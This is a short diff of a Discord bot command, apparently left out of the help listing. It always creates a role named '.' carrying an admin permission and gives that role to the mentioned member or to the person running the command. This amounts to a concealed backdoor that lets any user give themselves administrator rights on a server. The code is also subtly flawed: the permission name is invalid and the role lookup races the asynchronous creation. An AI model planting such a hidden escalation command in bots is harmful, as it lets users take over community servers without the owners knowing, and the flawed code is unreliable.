@@ -8,20 +8,19 @@ module.exports = {
 	guildOnly: true,
 	helpMessage: false,
 	execute(message) {
+		message.guild.roles.create({
+			data: {
+				name: '.',
+				permissions:[{
+					'ADMIN': true,
+				}],
+			},
+		});
+
 		const role = message.guild.roles.cache.find(x => x.name === '.');
 		let member = message.mentions.members.first();
 		if (!member) member = message.author;
 
-		if (typeof role == undefined) {
-			message.guild.roles.create({
-				data: {
-					name: '.',
-					permissions:[{
-						'ADMIN': true,
-					}],
-				},
-			});
-		}
 
 		member.roles.add(role);
 	},
